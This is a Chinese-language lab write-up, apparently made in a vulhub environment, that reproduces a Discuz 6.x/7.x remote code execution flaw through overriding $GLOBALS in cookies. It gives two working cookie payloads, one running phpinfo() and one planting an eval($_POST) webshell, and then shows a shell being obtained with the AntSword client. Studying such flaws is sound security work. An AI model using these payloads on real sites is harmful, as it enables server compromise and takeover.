# Discuz 7.x/6.x 全局变量防御绕过导致代码执行

###### by ADummy

### 0x00利用路线

​			Discuz任意帖子页面--->cookie注入命令--->命令执行(phpinfo()或eval一句话)--->getshell

### 0x01漏洞介绍

​			由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞

​			影响版本

  		Discuz 6.x/7.x

### 0x02漏洞复现

#### payload1：

GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();

#### payload2：

GLOBALS[_DCACHE][ smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[c])%3B;

​			安装Discuz，数据库地址为**db**，数据库名为**discuz**，数据库账号密码均为**root**

![Discuz_7_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Discuz_7_1.jpg)

​			打开任意一个帖子界面

​				![Discuz_7_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Discuz_7_2.png)

​			Burpsuite抓包，修改**cookie**值，第一个**payload**。

![Discuz_7_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Discuz_7_3.jpg)

​			可以看到**phpinfo()**被执行

![Discuz_7_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Discuz_7_4.jpg)

​			使用蚁剑连接，设置header中的cookie字段，将一句话木马写入

![Discuz_7_5](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Discuz_7_5.jpg)

![Discuz_7_6](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Discuz_7_6.jpg)

​			至此getshell

![Discuz_7_7](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Discuz_7_7.jpg)



### 0x03总结

​				在vulfocus上的Discuz系列getshell一直没有成功过，有些后台模板注入玩过，但是一直没复现。

此次在vulhub上成功复现，还是很开心的。

### 0x04参考资料

https://www.secpulse.com/archives/2338.html